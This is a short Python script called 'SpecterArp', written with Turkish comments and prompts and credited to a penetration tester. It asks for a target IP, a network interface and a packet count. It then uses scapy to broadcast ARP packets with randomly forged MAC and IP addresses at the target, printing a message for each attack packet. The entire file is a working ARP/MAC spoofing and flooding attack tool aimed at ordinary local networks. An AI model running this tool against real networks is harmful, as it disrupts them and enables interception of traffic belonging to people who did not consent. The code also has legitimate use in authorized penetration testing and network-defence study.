from scapy.all import Ether, ARP, sendp
import random
import time
from pyfiglet import Figlet
from colorama import init, Fore

# Colorama'yi başlatma
init()

def print_banner():
    """SpecterArp için banner yazdırır"""
    f = Figlet(font='slant', width=100)
    print(Fore.RED + f.renderText('SpecterArp'))
    print(Fore.MAGENTA + "                      | - |  By : Fenrir - Penetration Tester | - |         \n" + Fore.RESET)

def random_mac():
    """Rastgele bir MAC adresi üretir"""
    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def random_ip(base_ip="192.168.1."):
    """Rastgele bir IP adresi üretir"""
    return base_ip + str(random.randint(1, 254))

def mac_spoofing(target_ip, iface, packet_count, interval=1):
    """Belirtilen hedef IP adresine sahte MAC adresleriyle belirtilen sayıda paket gönderir"""
    for _ in range(packet_count):
        fake_mac = random_mac()
        fake_ip = random_ip()
        eth = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
        arp = ARP(psrc=fake_ip, hwsrc=fake_mac, pdst=target_ip)
        packet = eth / arp
        sendp(packet, iface=iface, verbose=False)
        
        print(Fore.RED + "Mac Paket Saldırı Başlatıldı!" + Fore.RESET, f"Gönderilen Sahte IP Adresi >> {fake_ip} Gönderilen Sahte MAC adresi >> {fake_mac}" + Fore.RESET)
        time.sleep(interval)

# Kullanıcıdan hedef IP adresi, ağ arayüzü ve gönderilecek paket sayısını alma
def main():
    print_banner()  # Bannerı yazdır

    target_ip = input("Yerel ağdaki hedef IP adresini girin: ")
    iface = input(Fore.CYAN + "Ağ arayüzünü girin (örneğin eth0): " + Fore.RESET)
    packet_count = int(input("Göndermek istediğiniz paket sayısını girin: "))

    mac_spoofing(target_ip, iface, packet_count)

if __name__ == "__main__":
    main()
